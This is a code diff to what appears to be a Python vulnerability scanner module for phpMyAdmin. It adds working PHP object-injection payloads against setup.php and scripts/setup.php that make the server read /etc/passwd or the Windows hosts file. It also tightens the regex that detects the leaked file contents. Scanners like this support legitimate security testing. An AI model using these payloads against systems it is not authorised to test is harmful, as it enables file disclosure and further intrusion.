@@ -25,6 +25,7 @@ from lib.tool.thread import thread
 from lib.tool import check
 from thirdparty import requests
 from time import sleep
+import re
 
 class phpMyadmin():
     def __init__(self):
@@ -52,6 +53,18 @@ class phpMyadmin():
         ]
         
         self.wooyun_2016_199433_payloads = [
+            {
+                'path': 'scripts/setup.php',
+                'data': 'action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}'
+            },
+            {
+                'path': 'scripts/setup.php',
+                'data': 'action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"C:/Windows/System32/drivers/etc/hosts";}'
+            },
+            {
+                'path': 'scripts/setup.php',
+                'data': 'action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"C:\Windows\System32\drivers\etc\hosts";}'
+            },
             {
                 'path': 'setup.php',
                 'data': 'action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}'
@@ -107,10 +120,9 @@ class phpMyadmin():
                 logger.logging(vul_info, 'Error')
                 return None
 
-            if (('/sbin/nologin' in res.text) 
-                or ('root:x:0:0:root' in res.text) 
-                or ('Microsoft Corp' in res.text) 
-                or ('Microsoft TCP/IP for Windows' in res.text)
+            if (re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res.text, re.I|re.M|re.S)
+                or (('Microsoft Corp' in res.text) 
+                    and ('Microsoft TCP/IP for Windows' in res.text))
             ):
                 results = {
                     'Target': target,
@@ -161,10 +173,9 @@ class phpMyadmin():
                 logger.logging(vul_info, 'Error')
                 return None
 
-            if (('/sbin/nologin' in res.text) 
-                or ('root:x:0:0:root' in res.text) 
-                or ('Microsoft Corp' in res.text) 
-                or ('Microsoft TCP/IP for Windows' in res.text)
+            if (re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res.text, re.I|re.M|re.S)
+                or (('Microsoft Corp' in res.text) 
+                    and ('Microsoft TCP/IP for Windows' in res.text))
             ):
                 results = {
                     'Target': target,
